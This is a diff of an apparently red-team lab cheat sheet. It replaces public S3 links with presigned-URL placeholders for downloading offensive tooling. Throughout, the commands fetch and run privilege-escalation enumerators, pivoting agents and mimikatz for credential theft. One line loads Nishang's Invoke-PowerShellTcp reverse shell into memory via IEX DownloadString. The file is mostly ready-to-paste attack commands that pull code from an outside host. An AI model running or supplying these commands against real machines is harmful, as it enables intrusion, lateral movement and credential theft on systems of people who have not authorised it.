@@ -2,19 +2,19 @@
 LINUX ENUMERATION
 ==============================
 
-curl -O http://redteam-lab-payloads.s3.amazonaws.com/l/linpeas.sh
+curl -fsSL "<PRESIGNED_URL_TO_l/linpeas.sh>" -o linpeas.sh
 chmod +x linpeas.sh
 ./linpeas.sh
 
-curl -O http://redteam-lab-payloads.s3.amazonaws.com/l/linenum.sh
+curl -fsSL "<PRESIGNED_URL_TO_l/linenum.sh>" -o linenum.sh
 chmod +x linenum.sh
 ./linenum.sh
 
-curl -O http://redteam-lab-payloads.s3.amazonaws.com/l/linux-exploit-suggester.sh
+curl -fsSL "<PRESIGNED_URL_TO_l/linux-exploit-suggester.sh>" -o linux-exploit-suggester.sh
 chmod +x linux-exploit-suggester.sh
 ./linux-exploit-suggester.sh
 
-curl -O http://redteam-lab-payloads.s3.amazonaws.com/l/pspy64
+curl -fsSL "<PRESIGNED_URL_TO_l/pspy64>" -o pspy64
 chmod +x pspy64
 ./pspy64
 
@@ -23,13 +23,13 @@ chmod +x pspy64
 PIVOTING
 ==============================
 
-curl -O http://redteam-lab-payloads.s3.amazonaws.com/p/chisel
+curl -fsSL "<PRESIGNED_URL_TO_p/chisel>" -o chisel
 chmod +x chisel
 
-curl -O http://redteam-lab-payloads.s3.amazonaws.com/p/ligolo-agent
+curl -fsSL "<PRESIGNED_URL_TO_p/ligolo-agent>" -o ligolo-agent
 chmod +x ligolo-agent
 
-curl -O http://redteam-lab-payloads.s3.amazonaws.com/p/socat
+curl -fsSL "<PRESIGNED_URL_TO_p/socat>" -o socat
 chmod +x socat
 
 
@@ -37,22 +37,31 @@ chmod +x socat
 WINDOWS ENUMERATION
 ==============================
 
-powershell iwr http://redteam-lab-payloads.s3.amazonaws.com/w/winpeas.exe -OutFile winpeas.exe
+powershell iwr "<PRESIGNED_URL_TO_w/winpeas.exe>" -OutFile winpeas.exe
 
-powershell iwr http://redteam-lab-payloads.s3.amazonaws.com/w/seatbelt.exe -OutFile seatbelt.exe
+powershell iwr "<PRESIGNED_URL_TO_w/seatbelt.exe>" -OutFile seatbelt.exe
 
-powershell iwr http://redteam-lab-payloads.s3.amazonaws.com/w/sharpup.exe -OutFile sharpup.exe
+powershell iwr "<PRESIGNED_URL_TO_w/sharpup.exe>" -OutFile sharpup.exe
 
 
 ==============================
 CREDENTIAL ACCESS
 ==============================
 
-powershell iwr http://redteam-lab-payloads.s3.amazonaws.com/c/mimikatz.exe -OutFile mimikatz.exe
+powershell iwr "<PRESIGNED_URL_TO_c/mimikatz.exe>" -OutFile mimikatz.exe
 
 
 ==============================
 NISHANG
 ==============================
 
-powershell IEX (New-Object Net.WebClient).DownloadString("http://redteam-lab-payloads.s3.amazonaws.com/tools/windows/nishang/Shells/Invoke-PowerShellTcp.ps1")
+powershell IEX (New-Object Net.WebClient).DownloadString("<PRESIGNED_URL_TO_tools/windows/nishang/Shells/Invoke-PowerShellTcp.ps1>")
+
+==============================
+NOTES
+==============================
+
+This file intentionally uses presigned URL placeholders.
+Generate a short-lived URL list (15 minutes) from `docs/s3_inventory.txt` using:
+
+  scripts/presign_from_inventory.sh --bucket redteam-lab-payloads
